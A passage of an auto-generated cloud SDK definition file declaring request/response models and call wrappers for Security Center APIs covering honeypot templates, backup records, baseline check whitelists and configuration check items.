    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='196'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model ListAutoTagRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAutoTagRulesResponseBody(name='body'),
}

/**
 * @summary Queries asset auto-tagging rules that are created by using the feature of asset management rules. You can create rules on the System Configuration > Feature Settings > Multi-cloud Configuration Management > Asset Management Rule page in the Security Center console.
 *
 * @param request ListAutoTagRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAutoTagRulesResponse
 */
async function listAutoTagRulesWithOptions(request: ListAutoTagRulesRequest, runtime: Util.RuntimeOptions): ListAutoTagRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAutoTagRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries asset auto-tagging rules that are created by using the feature of asset management rules. You can create rules on the System Configuration > Feature Settings > Multi-cloud Configuration Management > Asset Management Rule page in the Security Center console.
 *
 * @param request ListAutoTagRulesRequest
 * @return ListAutoTagRulesResponse
 */
async function listAutoTagRules(request: ListAutoTagRulesRequest): ListAutoTagRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAutoTagRulesWithOptions(request, runtime);
}

model ListAvailableHoneypotRequest {
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot is deployed.', example='4341018b-8e01-43f6-b1d2-af29a2a4****'),
}

model ListAvailableHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images that are used for the honeypot.', example='22'),
  data?: [ 
    {
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image.', example='RuoYi'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image.', example='sha256:007095d6de9c7a343e9fc1f74a7efc9c5de9d5454789d2fa505a1b3fc62****'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='ruoyi'),
      honeypotImageType?: string(name='HoneypotImageType', description='The type of the image.', example='Web'),
      honeypotImageVersion?: string(name='HoneypotImageVersion', description='The version of the image.', example='1.0.2'),
      multiports?: string(name='Multiports', description='The port that is supported by the honeypot. The value is in the JSON format. Valid values:

*   **log_type**: the log type
*   **proto**: the supported protocol
*   **description**: the description
*   **ports**: the supported ports
*   **port_str**: the supported port number of the string type
*   **type**: the type', example='[{"log_type":"web","proto":"tcp","description":"webServerPort","ports":[80.0],"port_str":"80","type":"web"}]'),
      proto?: string(name='Proto', description='The protocol that is supported by the honeypot.', example='tcp'),
      servicePort?: string(name='ServicePort', description='The service port of the honeypot.', example='27017.0'),
      template?: string(name='Template', description='The configuration template of the honeypot.', example='{}'),
    }
  ](name='Data', description='An array consisting of the information about the images that are used for the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6C24D883-984D-52FD-BB66-5F89F86E4837'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListAvailableHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAvailableHoneypotResponseBody(name='body'),
}

/**
 * @summary Queries the information about available honeypot templates.
 *
 * @param request ListAvailableHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAvailableHoneypotResponse
 */
async function listAvailableHoneypotWithOptions(request: ListAvailableHoneypotRequest, runtime: Util.RuntimeOptions): ListAvailableHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAvailableHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about available honeypot templates.
 *
 * @param request ListAvailableHoneypotRequest
 * @return ListAvailableHoneypotResponse
 */
async function listAvailableHoneypot(request: ListAvailableHoneypotRequest): ListAvailableHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAvailableHoneypotWithOptions(request, runtime);
}

model ListBackupRecordRequest {
  backupEndTime?: long(name='BackupEndTime', description='The timestamp when the backup task ended. Unit: milliseconds.', example='1699600611000'),
  backupStartTime?: long(name='BackupStartTime', description='The timestamp when the backup task started. Unit: milliseconds.', example='1699514211000'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='1'),
  machineRemark?: string(name='MachineRemark', description='The information that you want to use to identify the servers protected by the anti-ransomware policy. You can enter the IP address or ID of a server.', example='192.168.XX.XX'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  statusList?: [ string ](name='StatusList', description='The backup task status. Valid values:

*   **BACKUP_COMPLETE**: The backup task is successful.
*   **BACKUP_FAILED**: The backup task failed.
*   **PARTIAL_COMPLETE**: The backup task is partially successful.'),
}

model ListBackupRecordResponseBody = {
  backupRecordList?: [ 
    {
      backupEndTime?: long(name='BackupEndTime', description='The timestamp when the backup task ended. Unit: milliseconds.', example='1699600611000'),
      backupJobId?: string(name='BackupJobId', description='The backup task ID.', example='a006f24d069843c88688672d74ee****'),
      backupPlanId?: string(name='BackupPlanId', description='The backup plan ID.', example='plan-000c4tt43nolmx96****'),
      backupStartTime?: long(name='BackupStartTime', description='The timestamp when the backup task started. Unit: milliseconds.', example='1699514211000'),
      backupStatus?: string(name='BackupStatus', description='The backup task status. Valid value:

*   **BACKUP_COMPLETE**: The backup task is successful.
*   **BACKUP_FAILED**: The backup task failed.
*   **PARTIAL_COMPLETE**: The backup task is partially successful.', example='BACKUP_COMPLETE'),
      clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-0002bgagelj3d2sc****'),
      errorCode?: string(name='ErrorCode', description='The error code of the backup task.', example='FILE_CACHE_NO_SPACE'),
      errorMessage?: string(name='ErrorMessage', description='The error message of the backup task.', example='FILE_CACHE_NO_SPACE'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-wz9ikn44p46krnic****'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='openapi'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.1.1.1'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.1.1'),
      ip?: string(name='Ip', description='The IP address of the server.', example='1.1.1.1'),
      regionId?: string(name='RegionId', description='The ID of the region in which the backup is stored.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.', example='b93cccb9-f19f-4886-97fe-47df26ba****'),
    }
  ](name='BackupRecordList', description='The details of the backup record.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='2'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID, which is used to locate and troubleshoot issues.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model ListBackupRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListBackupRecordResponseBody(name='body'),
}

/**
 * @summary Queries backup records.
 *
 * @param request ListBackupRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListBackupRecordResponse
 */
async function listBackupRecordWithOptions(request: ListBackupRecordRequest, runtime: Util.RuntimeOptions): ListBackupRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.backupEndTime)) {
    query['BackupEndTime'] = request.backupEndTime;
  }
  if (!Util.isUnset(request.backupStartTime)) {
    query['BackupStartTime'] = request.backupStartTime;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListBackupRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries backup records.
 *
 * @param request ListBackupRecordRequest
 * @return ListBackupRecordResponse
 */
async function listBackupRecord(request: ListBackupRecordRequest): ListBackupRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return listBackupRecordWithOptions(request, runtime);
}

model ListBaselineCheckWhiteRecordRequest {
  checkIds?: [ long ](name='CheckIds', description='The IDs of check items.'),
  checkItemFuzzy?: string(name='CheckItemFuzzy', description='The name of the check item. Fuzzy match is supported.', example='redis'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  recordIds?: [ long ](name='RecordIds', description='The IDs of the whitelist rules.'),
  source?: string(name='Source', description='The data source. If you leave this parameter empty, the default value is used. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
}

model ListBaselineCheckWhiteRecordShrinkRequest {
  checkIdsShrink?: string(name='CheckIds', description='The IDs of check items.'),
  checkItemFuzzy?: string(name='CheckItemFuzzy', description='The name of the check item. Fuzzy match is supported.', example='redis'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  recordIdsShrink?: string(name='RecordIds', description='The IDs of the whitelist rules.'),
  source?: string(name='Source', description='The data source. If you leave this parameter empty, the default value is used. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
}

model ListBaselineCheckWhiteRecordResponseBody = {
  list?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='696'),
      checkItem?: string(name='CheckItem', description='The description of the check item.', example='Config the Event Audit policys'),
      checkType?: string(name='CheckType', description='The type of the check item.', example='Security audit'),
      checkTypeDisName?: string(name='CheckTypeDisName', description='The display name of the check item type.', example='Security audit'),
      lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
      reason?: string(name='Reason', description='The reason why the check item is added to the whitelist.', example='AutoTest'),
      recordId?: long(name='RecordId', description='The ID of the whitelist rule.', example='79412'),
      source?: string(name='Source', description='The data source. Valid values:

*   **default**: server
*   **agentless**: agentless detection', example='agentless'),
      target?: string(name='Target', description='The object that is added to the whitelist.', example='HOST_BASELINE_WHITE_LIST_21'),
      targetType?: string(name='TargetType', description='The type of the assets on which the whitelist rule takes effect. Valid values:

*   **all_instance**: all servers
*   **instance**: specific servers', example='instance'),
    }
  ](name='List', description='The whitelist rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model ListBaselineCheckWhiteRecordResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListBaselineCheckWhiteRecordResponseBody(name='body'),
}

/**
 * @summary Queries the whitelist rules for a baseline check item.
 *
 * @param tmpReq ListBaselineCheckWhiteRecordRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListBaselineCheckWhiteRecordResponse
 */
async function listBaselineCheckWhiteRecordWithOptions(tmpReq: ListBaselineCheckWhiteRecordRequest, runtime: Util.RuntimeOptions): ListBaselineCheckWhiteRecordResponse {
  Util.validateModel(tmpReq);
  var request = new ListBaselineCheckWhiteRecordShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.checkIds)) {
    request.checkIdsShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.checkIds, 'CheckIds', 'json');
  }
  if (!Util.isUnset(tmpReq.recordIds)) {
    request.recordIdsShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.recordIds, 'RecordIds', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.checkIdsShrink)) {
    query['CheckIds'] = request.checkIdsShrink;
  }
  if (!Util.isUnset(request.checkItemFuzzy)) {
    query['CheckItemFuzzy'] = request.checkItemFuzzy;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.recordIdsShrink)) {
    query['RecordIds'] = request.recordIdsShrink;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListBaselineCheckWhiteRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the whitelist rules for a baseline check item.
 *
 * @param request ListBaselineCheckWhiteRecordRequest
 * @return ListBaselineCheckWhiteRecordResponse
 */
async function listBaselineCheckWhiteRecord(request: ListBaselineCheckWhiteRecordRequest): ListBaselineCheckWhiteRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return listBaselineCheckWhiteRecordWithOptions(request, runtime);
}

model ListCheckInstanceResultRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

This parameter is required.', example='23'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  instanceIdKey?: string(name='InstanceIdKey', description='The ID of the instance.', example='i-uf64w4q6p9jti5gl****'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of cloud services.'),
  instanceNameKey?: string(name='InstanceNameKey', description='The name of the instance.', example='i-uf64w4q6p9jti5gl****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Maximum value: 100.', example='20'),
  regionIdKey?: string(name='RegionIdKey', description='The region ID of the instance.', example='cn-qingdao'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which the check items are sorted.'),
  statuses?: [ string ](name='Statuses', description='The statuses of check items.'),
}

model ListCheckInstanceResultResponseBody = {
  basicData?: [ 
    {
      id?: long(name='Id', description='The ID of the check result for the instance.', example='300054'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='rm-m5es7ch1s62i4****'),
      instanceInfo?: {
        config?: [ 
          {
            name?: string(name='Name', description='The name of the configuration item, which is unique.', example='prot'),
            showName?: string(name='ShowName', description='The display name of the configuration item for internationalization.', example='prot'),
            value?: string(name='Value', description='The value of the configuration item specified for the instance.', example='8080'),
          }
        ](name='Config', description='The information about the configuration item whose risks are fixed for the instance.'),
        firstUpdateTime?: long(name='FirstUpdateTime', description='The time of the first check.', example='1716447535531'),
        lastUpdateTime?: long(name='LastUpdateTime', description='The time of the last check.', example='1716447535531'),
      }(name='InstanceInfo', description='The information about the instance on which the check item is used.'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='sg-t4nbk2aodzio52xv****'),
      regionId?: string(name='RegionId', description='The region ID of the instance.', example='ap-southeast-1'),
      status?: string(name='Status', description='The states of check items. Multiple states are separated with commas (,). Valid values:

*   **PASS**: passed
*   **NOT_PASS**: failed
*   **CHECKING**: being checked
*   **NOT_CHECK**: not checked
*   **WHITELIST**: added to the whitelist', example='NOT_PASS'),
      statusMessage?: string(name='StatusMessage', description='The exception message of the check item.', example='Task is failed.'),
    }
  ](name='BasicData', description='The basic information about the affected instances.'),
  checks?: [ map[string]any ](name='Checks', description='The extended information about the instances.', example='[{
	"SecurityGroupNameShow": {
		"value": "Sas_Malicious_Ip_Security_Group"
	},
	"InstanceIdShow": {
		"link": "https://ecs.console.aliyun.com/#/securityGroupDetail/region/ap-southeast-1/groupId/sg-t4nbk2aodzio52xvj00s/rule/intranetIngress",
		"value": "sg-t4nbk2aodzio52xv****"
	}
}]'),
  columns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
          showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
          type?: string(name='Type', description='The format of the check result for the instance. Valid values:

*   **text**
*   **link**', example='text'),
        }
      ](name='Grids', description='The metadata information about the details of the instance.'),
      key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
      search?: boolean(name='Search', description='Indicates whether the search condition is used. Valid values:

*   **true**
*   **false**', example='true'),
      searchKey?: string(name='SearchKey', description='The search key.', example='InstanceIdKey'),
      showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
      type?: string(name='Type', description='The type of the check result for the instance. Valid values:

*   **text**
*   **link**', example='text'),
    }
  ](name='Columns', description='The metadata information about the search conditions that can be used to filter instances.'),
  pageInfo?: {
    count?: string(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3AB18264-8A1B-52A6-A9AF-A886556E0F2E'),
}

model ListCheckInstanceResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckInstanceResultResponseBody(name='body'),
}

/**
 * @summary Queries the instances that failed a specified check item of configuration assessment.
 *
 * @param request ListCheckInstanceResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckInstanceResultResponse
 */
async function listCheckInstanceResultWithOptions(request: ListCheckInstanceResultRequest, runtime: Util.RuntimeOptions): ListCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIdKey)) {
    query['InstanceIdKey'] = request.instanceIdKey;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceNameKey)) {
    query['InstanceNameKey'] = request.instanceNameKey;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdKey)) {
    query['RegionIdKey'] = request.regionIdKey;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the instances that failed a specified check item of configuration assessment.
 *
 * @param request ListCheckInstanceResultRequest
 * @return ListCheckInstanceResultResponse
 */
async function listCheckInstanceResult(request: ListCheckInstanceResultRequest): ListCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckInstanceResultWithOptions(request, runtime);
}

model ListCheckItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid value:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='10'),
}

model ListCheckItemResponseBody = {
  checkItems?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='21'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='Enable deletion protection'),
      customConfigs?: [ 
        {
          defaultValue?: string(name='DefaultValue', description='The default value of the check item. The value is a string.', example='0'),
          name?: string(name='Name', description='The name of the check item.', example='IPList'),
          showName?: string(name='ShowName', description='The display name of the check item.', example='Ensure RAM password policy prevents password reuse'),
          typeDefine?: string(name='TypeDefine', description='The type of the check item. The value is a JSON string.', example='{\\\\"type\\\\":\\\\"LIST\\\\",\\\\"range\\\\":[1,512],\\\\"listType\\\\":{\\\\"type\\\\":\\\\"STRING\\\\",\\\\"range\\\\":[0,22]}}'),
          value?: string(name='Value', description='The specified value of the check item. The value is a string.', example='1'),
        }
      ](name='CustomConfigs', description='The check items.'),
      description?: {
        type?: string(name='Type', description='The type of the description of the check item. Valid value:

*   **text**', example='text'),
        value?: string(name='Value', description='The content of the description for the check item when the Type parameter is text.', example='The download of query results that are returned by SELECT statements in DataStudio must be prohibited at the MaxCompute level.'),
      }(name='Description', description='The description of the check item.'),
      estimatedCount?: int32(name='EstimatedCount', description='The estimated quota that will be consumed by this check item.', example='30'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid values:

*   If **InstanceType** is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If **InstanceType** is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If **InstanceType** is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If **InstanceType** is set to **WAF**, this parameter supports the following valid value:

    *   **DOMAIN**

*   If **InstanceType** is set to other values, this parameter supports the following valid values:

    *   **INSTANCE**', example='ECS'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid values:

*   **ECS**: Elastic Compute Service (ECS).
*   **SLB**: Server Load Balancer (SLB).
*   **RDS**: ApsaraDB RDS.
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB).
*   **KVSTORE**: ApsaraDB for Redis (Redis).
*   **ACR**: Container Registry.
*   **CSK**: Container Service for Kubernetes (ACK).
*   **VPC**: Virtual Private Cloud (VPC).
*   **ACTIONTRAIL**: ActionTrail.
*   **CDN**: Alibaba Cloud CDN (CDN).
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service).
*   **RDC**: Apsara Devops.
*   **RAM**: Resource Access Management (RAM).
*   **DDOS**: Anti-DDoS.
*   **WAF**: Web Application Firewall (WAF).
*   **OSS**: Object Storage Service (OSS).
*   **POLARDB**: PolarDB.
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL.
*   **MSE**: Microservices Engine (MSE).
*   **NAS**: File Storage NAS (NAS).
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP).
*   **EIP**: Elastic IP Address (EIP).', example='OSS'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      sectionIds?: [ long ](name='SectionIds', description='The IDs of the sections associated with the check items.'),
      vendor?: string(name='Vendor', description='The type of the cloud asset. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: an asset outside Alibaba Cloud.
*   **2**: an asset in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: a simple application server.', example='0'),
    }
  ](name='CheckItems', description='The check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model ListCheckItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCheckItemResponseBody(name='body'),
}

/**
 * @summary Queries the check items that can be customized.
 *
 * @param request ListCheckItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCheckItemResponse
 */
async function listCheckItemWithOptions(request: ListCheckItemRequest, runtime: Util.RuntimeOptions): ListCheckItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the check items that can be customized.
 *
 * @param request ListCheckItemRequest
 * @return ListCheckItemResponse
 */
async function listCheckItem(request: ListCheckItemRequest): ListCheckItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWithOptions(request, runtime);
}

model ListCheckItemWarningMachineRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

This parameter is required.', example='8'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to query containers.', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to query containers.', example='ce89cdd0ea732472a8703821b19e****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](https://help.aliyun.com/document_detail/130972.html) operation to query the ID of the asset group.', example='1161****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  remark?: string(name='Remark', description='The keyword that is used to query servers in fuzzy match mode.', example='225'),
  riskType?: string(name='RiskType', description='The type of the check item.', example='cis'),
  source?: string(name='Source', description='The data source. Default value: default. Valid values:

*   **default**: The check items of baselines for hosts.
*   **agentless**: The check items of baselines for agentless detection.', example='agentless'),
  status?: int32(name='Status', description='The status of the check item. Valid values:

*   1: failed

*   2: verifying

*   3: passed

*   6: ignored

*   7: fixing', example='3'),
  uuidList?: [ string ](name='UuidList', description='The UUID array of the servers.'),
}

model ListCheckItemWarningMachineResponseBody = {
  list?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

